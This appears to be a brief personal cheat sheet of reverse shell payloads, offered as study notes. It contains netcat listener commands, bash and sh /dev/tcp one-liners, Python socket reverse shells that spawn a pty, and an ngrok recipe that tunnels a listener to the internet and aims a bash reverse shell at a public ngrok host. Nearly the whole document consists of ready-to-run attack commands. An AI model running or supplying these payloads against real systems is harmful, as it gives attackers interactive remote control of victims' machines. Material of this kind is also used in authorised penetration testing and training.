## Reverse Shell Learing:
### Netcat using:
    Windows: $ ncat -lvnp 444
    Linux: $ nc -lvnp 444
#### Bin & Bash:
```
1. sh -i >& /dev/tcp/0.0.0.0/4444 0>&1
2. /bin/sh -i >& /dev/tcp/0.0.0.0/4444 0>&1
3. bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
4. /bin/bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
```
#### Python:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
#### Python3:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

### Port forwarding using Ngrok:
```
1. Run ngrok
  $ ngrok tcp 1234   (Output is: tcp://0.tcp.in.ngrok.io:18304)
2. Run Netcat
  $ nc -lvnp 1234
3. Payloads:
 /bin/bash -i >& /dev/tcp/0.tcp.in.ngrok.io/18304 0>&1
```
